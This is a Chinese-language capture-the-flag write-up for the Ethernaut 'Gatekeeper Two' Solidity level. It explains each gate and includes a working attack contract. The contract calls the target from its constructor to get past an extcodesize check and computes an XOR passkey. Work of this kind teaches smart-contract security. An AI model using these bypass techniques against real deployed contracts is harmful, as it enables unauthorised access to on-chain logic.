# Ethernaut-Gatekeeper-Two
Ethernaut Gatekeeper Two解題思路

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract GatekeeperTwo {
        address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
    }

***跟GatekeeperOne很像但是多了assembly的用法***

modifier gateOne:也是一樣要建立一個攻擊合約去呼叫GatekeeperTwo合約就可以通過了

modifier gateTwo:這個用法是比較低階的Solidity用法可以更深層的呼叫特定得用法，但是語法錯誤就很容易revert，這個檢查呼叫者的 程式碼長度是否為0，

基本上合約的excodesize都一定會大於0，但是只要有建構子constructor我們就可以在部署之前先去呼叫特定的合約函式，因為還沒上鏈所以這一段的邏輯就會通過

modifier gateThree:要等於type(uint64).max換成16進位就是0xFFFFFFFFFFFFFFFF(全為1)，所以跟uint64(bytes8(keccak256(abi.encodePacked(address(this)))))做XOR我們就可以找出我們們要的passkey了

在用得到的passkey丟進enter裡面就可以了喔，但我這邊是直接帶進去函式裡面，但是結果都是一樣的

之後就可以按下提交了喔，就過關了！！！

這次的題目是我第一次知道可以在建構子就呼叫，因為之前我都覺得需要上鏈後才能有呼叫的動作。

以下為攻擊合約程式碼：

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface IGatekeeperTwo{
        function enter(bytes8 _gatekey)external returns (bool);
    }

    contract HackIt {
        IGatekeeperTwo public gate;
        constructor(address _target){
            gate=IGatekeeperTwo(_target);
            uint64 passkey=uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^ type(uint64).max;
            gate.enter(bytes8(passkey));
        }
    }


